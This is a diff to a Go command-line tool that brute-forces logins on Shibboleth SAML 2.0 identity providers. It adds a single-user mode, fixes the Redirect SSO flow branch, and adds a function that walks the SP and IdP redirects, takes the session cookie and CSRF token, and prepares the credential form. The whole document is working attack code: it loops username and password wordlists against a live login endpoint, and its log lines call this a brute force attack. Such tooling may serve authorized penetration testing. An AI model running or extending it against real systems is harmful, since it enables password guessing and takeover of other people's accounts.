@@ -25,28 +25,25 @@ func main() {
 	log.SetFormatter(&log.JSONFormatter{})
 
 	var usePOSTFlow bool
-	flag.BoolVar(&usePOSTFlow, "use-post-flow", true, "If set, the SAML 2.0 POST SSO flow will be used. Default flow")
-	flag.BoolVar(&usePOSTFlow, "pf", true, "If set, the SAML 2.0 POST SSO flow will be used. Default flow")
+	flag.BoolVar(&usePOSTFlow, "pf", true, "Shibboleth SAML 2.0 POST SSO Flow (default)")
 
 	var useRedirectFlow bool
-	flag.BoolVar(&useRedirectFlow, "use-redirect-flow", false, "If set, the SAML 2.0 Redirect SSO flow will be used")
-	flag.BoolVar(&useRedirectFlow, "rf", false, "")
+	flag.BoolVar(&useRedirectFlow, "rf", false, "Shibboleth SAML 2.0 Redirect SSO Flow")
+
+	var userToUse string
+	flag.StringVar(&userToUse, "u", "", "user to use")
 
 	var serviceProviderInitURL string
-	flag.StringVar(&serviceProviderInitURL, "service-provider-url", "", "")
-	flag.StringVar(&serviceProviderInitURL, "su", "", "")
+	flag.StringVar(&serviceProviderInitURL, "su", "", "the service provider start URL which initiates the authentication flow")
 
 	var identityProviderURL string
-	flag.StringVar(&identityProviderURL, "idp-url", "", "")
-	flag.StringVar(&identityProviderURL, "iu", "", "")
+	flag.StringVar(&identityProviderURL, "iu", "", "the identity provider base URL (everything before /idp, https://example.com)")
 
 	var usernameList string
-	flag.StringVar(&usernameList, "users", "", "")
-	flag.StringVar(&usernameList, "ul", "", "")
+	flag.StringVar(&usernameList, "ul", "", "path to file containing a list of user names to use")
 
 	var passwordList string
-	flag.StringVar(&passwordList, "passwords", "", "")
-	flag.StringVar(&passwordList, "pl", "", "")
+	flag.StringVar(&passwordList, "pl", "", "path to file containing a list of passwords to use")
 
 	flag.Parse()
 
@@ -72,7 +69,7 @@ func main() {
 	var sessionId string
 
 	if useRedirectFlow {
-		doc, sessionId = initializeSAML2POSTFlow(identityProviderURL, serviceProviderInitURL)
+		doc, sessionId = initializeSAML2RedirectFlow(identityProviderURL, serviceProviderInitURL)
 	} else {
 		doc, sessionId = initializeSAML2POSTFlow(identityProviderURL, serviceProviderInitURL)
 	}
@@ -81,8 +78,15 @@ func main() {
 		the internal short list of usernames and passwords are used
 	*/
 	users, passwords := openWordlists(usernameList, passwordList)
-	// optionally, resize scanner's capacity for lines over 64K, see next example
+
+	if userToUse != "" {
+		log.Info("Performing brute force attack using only one user name:", userToUse)
+		for _, pass := range passwords {
+			doc = performSAML2Authentication(doc, identityProviderURL, sessionId, userToUse, pass)
+		}
+	}
 	for _, user := range users {
+		log.Info("Performing brute force attack using user name:", user)
 		for _, pass := range passwords {
 			doc = performSAML2Authentication(doc, identityProviderURL, sessionId, user, pass)
 		}
@@ -123,6 +127,98 @@ func openWordlists(usernameList string, passwordList string) ([]string, []string
 
 	}
 	return users, passwords
+}
+
+func initializeSAML2RedirectFlow(baseURL string, serviceProviderURL string) (*goquery.Document, string) {
+	/*
+		STEP 1: Get the SAML request from the intended service provider
+
+		Creating the initial SAML authentication request as crafted from the service provider. This uses an GET request
+		to the service provider to obtain the contained information and SAML request.
+	*/
+	resp, doc := sendGet(serviceProviderURL, "", "", "")
+	log.Debug("Performed SP GET to obtain the information prepared by the service provider to initiate the authentication flow")
+	// If successful the identity provider responds with a redirect to the next step in the authentication flow.
+
+	location, err := resp.Location()
+	if err != nil {
+		log.Fatalf("Request failed: " + err.Error())
+	}
+
+	/*
+		STEP 1: Get the SAML request from the intended service provider
+
+		Creating the initial SAML authentication request as crafted from the service provider. This uses an GET request
+		to the service provider to obtain the contained information and SAML request.
+	*/
+	resp, doc = sendGet(location.String(), "", "", "")
+	log.Debug("Performed IDP GET to initiate the authentication flow from the service provider")
+
+	location, err = resp.Location()
+	if err != nil {
+		log.Fatalf("Request failed: " + err.Error())
+	}
+
+	sessionId := resp.Cookies()[0].String()
+
+	/*
+		STEP 3: Obtain information for authentication status check
+
+		The next step in the authentication flow is usually some configuration of the involved javascript which instructs
+		obtaining information stored in the local storage in order to check if the user is already authenticated.
+		Therefore, a GET request is performed whose response contains the javascript which is automatically executed and
+		performs the check and sends automatically a POST thereafter.
+	*/
+	resp, doc = sendGet(location.String(), "", sessionId, "")
+	log.Debug("Performed IDP GET to perform the configuration / authentication status check in the authentication flow")
+
+	/*
+		Getting the required information from the response, such as the CSRF token and the action URL, and prepare them
+		for the post as data.
+	*/
+	var initPostData = `&shib_idp_ls_exception.shib_idp_session_ss=&shib_idp_ls_success.shib_idp_session_ss=true&
+shib_idp_ls_value.shib_idp_session_ss=&shib_idp_ls_exception.shib_idp_persistent_ss=&
+shib_idp_ls_success.shib_idp_persistent_ss=true&shib_idp_ls_value.shib_idp_persistent_ss=&
+shib_idp_ls_supported=true&_eventId_proceed=`
+
+	element := getElementOrAttributeValueFromDocument(doc, "input[name='csrf_token']", "value")
+	log.Debug("Obtained SAMLRequest from response: %s", element[0])
+	formAction := getElementOrAttributeValueFromDocument(doc, "form", "action")
+	log.Debug("Obtained actionURL from response: %s", formAction[0])
+
+	endpoint := formAction[0]
+	if !IsUrl(formAction[0]) {
+		endpoint = baseURL + formAction[0]
+	}
+
+	postData := "csrf_token=" + element[0] + initPostData
+	/*
+		STEP 4: Post current authentication status and configuration
+
+		Sending the authentication status and the configuration as obtained from the local storage. In our case we
+		always send the empty local storage contents.
+		TODO: Check if there could be some issue with the local storage content. Check manual
+	*/
+	resp, doc = sendPost(endpoint, postData, sessionId, "")
+	log.Debug("Performed IDP POST providing some configuration data (as redirect)")
+
+	// If successful the identity provider responds with a redirect to the next step in the authentication flow
+	location, err = resp.Location()
+	if err != nil {
+		log.Fatalf("Request failed: " + err.Error())
+	}
+
+	/*
+		STEP 5: Prepare for authentication
+
+		Obtain the final form which is used to send credentials for authentication. The contained csrf_token and the
+		action url are required as input for the next step.
+	*/
+	resp, doc = sendGet(location.String(), "", sessionId, "")
+	log.Debug("Performed redirected IDP GET request after configuration")
+
+	return doc, sessionId
+
 }
 
 func initializeSAML2POSTFlow(baseURL string, serviceProviderURL string) (*goquery.Document, string) {
